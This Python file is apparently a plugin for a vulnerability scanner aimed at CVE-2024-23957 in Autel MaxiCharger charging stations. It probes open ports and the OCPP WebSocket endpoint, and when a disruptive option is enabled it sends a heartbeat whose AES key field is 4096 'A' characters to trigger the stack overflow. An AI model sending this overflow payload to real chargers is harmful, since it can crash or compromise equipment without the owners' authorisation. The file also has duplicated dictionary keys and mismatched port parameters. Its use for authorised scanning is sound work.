#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, detection_confidence, service_open, tcp_banner

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    'cve': 'CVE-2024-23957',
    'year': 2024,
    'domain': 'network',
    'vendor_product': 'Unknown',
    'component': 'Unknown',
    'type': 'Unknown',
    'summary': 'CVE-2024-23957 栈溢出/RCE Active Validation',
    'source_url': 'https://nvd.nist.gov/vuln/detail/CVE-2024-23957',
    'affected': [{'vendor': 'Unknown', 'product': 'Unknown', 'versions': []}],
    'id': 0,
    "id": 37,
    "cve": "CVE-2024-23957",
    "year": 2024,
    "domain": "IVI/EVSE/车载SoC",
    "vendor_product": "Autel MaxiCharger AC Elite Business C50",
    "component": "DLB_HostHeartBeat",
    "type": "栈溢出/RCE",
    "summary": "网络邻近攻击者无需认证可通过心跳处理触发RCE。",
    "source_description": "Autel MaxiCharger AC Elite Business C50 DLB_HostHeartBeat Stack-based Buffer Overflow Remote Code Execution Vulnerability. This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of Autel MaxiCharger AC Elite Business C50 charging stations. Authentication is not required to exploit this vulnerability.\n\nThe specific flaw exists within the DLB_HostHeartBeat handler of the DLB protocol implementation. When parsing an AES key, the process does not properly validate the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of the device.\n\nWas ZDI-CAN-23241",
    "poc_status": "ZDI/ASRG公告；通常无公开完整PoC",
    "research_value": "多来自Pwn2Own/ASRG披露，适合攻击面枚举与固件安全研究。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-23957",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-23957",
        "https://www.zerodayinitiative.com/advisories/ZDI-24-854/",
        "https://cveawg.mitre.org/api/cve/CVE-2024-23957"
    ],
    "affected": [
        {
            "vendor": "Autel",
            "product": "MaxiCharger AC Elite Business C50",
            "versions": [
                {
                    "version": "1.32.00",
                    "status": "affected"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-23957",
        "Autel",
        "MaxiCharger",
        "Elite",
        "Business",
        "C50",
        "DLB_HostHeartBeat",
        "RCE",
        "Stack-based",
        "Buffer",
        "Overflow",
        "Remote",
        "Code",
        "Execution",
        "Vulnerability",
        "vulnerability",
        "network-adjacent",
        "attackers",
        "execute",
        "arbitrary",
        "code",
        "installations",
        "charging",
        "stations",
        "Authentication",
        "required",
        "MaxiCharger AC Elite Business C50"
    ],
    "active_payload_text": "DLB_HostHeartBeat|" + "AESKEY=" + ("A" * 4096) + "|SEQ=1|MODE=sync",
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2024-23957: Autel MaxiCharger OCPP WebSocket + DLB heartbeat overflow."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 3000))
    tls = bool(params.get("tls", False))
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or bool(params.get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2024-23957",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP/WebSocket behavioral probe - Autel MaxiCharger DLB heartbeat stack overflow",
    }

    active_port = None
    for try_port in [port, 3000, 8080, 7700, 80]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port
    probe = HTTPProbe(target_ip, active_port, tls=tls)

    r_ws = probe.request(
        "GET", "/ocpp",
        extra_headers={
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
        }
    )
    evidence["ws_upgrade_status"] = r_ws.get("status")
    ws_resp = r_ws.get("body_text", "")
    if "101" == str(r_ws.get("status")) or "websocket" in ws_resp.lower():
        evidence["websocket_supported"] = True

    if allow_disruptive:
        oversized_aes_key = "A" * 4096
        heartbeat_payload = f"DLB_HostHeartBeat|AESKEY={oversized_aes_key}|SEQ=1|MODE=sync".encode()
        r_hb = probe.post("/dlb/heartbeat", heartbeat_payload, "application/octet-stream")
        evidence["heartbeat_overflow_status"] = r_hb.get("status")
        if r_hb.get("status") in (500, None) or r_hb.get("error"):
            evidence["overflow_triggered"] = True
            return {
                "vulnerable": None,
                "evidence": evidence,
                "detection_confidence": detection_confidence("B", evidence, "overflow_response"),
                "requires_manual_review": True,
            }

    banner = tcp_banner(target_ip, active_port, probe=b"\x00\x00")
    if banner:
        evidence["tcp_banner"] = repr(banner[:100])

    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("C", evidence, "ocpp_service_probed"),
        "requires_manual_review": True,
    }

class Poc31CVE202423957StackOverflowRCEAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-031"
    meta_poc_name = 'CVE-2024-23957 RCE Active Validation'
    meta_cve_id = 'CVE-2024-23957'
    meta_severity = 'High'
    meta_protocol = 'tcp'
    meta_target_os = ['all']
    meta_required_params = ['target_ip', 'target_port']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-23957'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2024-23957']
    meta_attack_surface = '网络服务'
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "31_Autel_MaxiCharger_Heartbeat_Stack_Overflow_RCE_Audit") if "VULN" in dir() else "31_Autel_MaxiCharger_Heartbeat_Stack_Overflow_RCE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc31CVE202423957StackOverflowRCEAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
